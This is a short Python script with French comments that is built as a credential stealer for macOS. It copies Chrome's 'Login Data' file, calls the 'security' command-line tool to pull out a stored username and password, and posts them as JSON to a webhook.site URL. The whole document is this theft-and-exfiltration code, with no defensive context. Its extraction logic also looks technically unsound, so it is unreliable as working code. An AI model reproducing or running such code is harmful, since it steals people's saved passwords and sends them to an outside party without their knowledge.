import os
import shutil
import subprocess
import requests
import json

# Chemin vers le dossier contenant les données de Chrome sur MacOS
chrome_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')

# Chemin vers le fichier contenant les mots de passe de Chrome
login_db = os.path.join(chrome_path, 'Login Data')

# Copie du fichier Login Data pour éviter les problèmes de verrouillage
temp_file = os.path.join(os.getcwd(), 'chrome_login_data')
shutil.copy2(login_db, temp_file)

# Exécution de l'outil de ligne de commande "security" pour extraire les mots de passe
output = subprocess.check_output(f"security find-internet-password -s 'Chrome' -g {temp_file}", shell=True)

# Suppression du fichier temporaire
os.remove(temp_file)

# Conversion de la sortie en chaîne de caractères et suppression des caractères de contrôle
output = output.decode('utf-8').replace('\n', '').replace('\t', '')

# Extraction du nom d'utilisateur et du mot de passe
username = output.split('"acct"<blob>="')[1].split('"')[0]
password = output.split('password: "')[1].split('"')[0]

# Envoi du nom d'utilisateur et du mot de passe à un webhook
webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
data = {'username': username, 'password': password}
headers = {'Content-type': 'application/json'}
response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
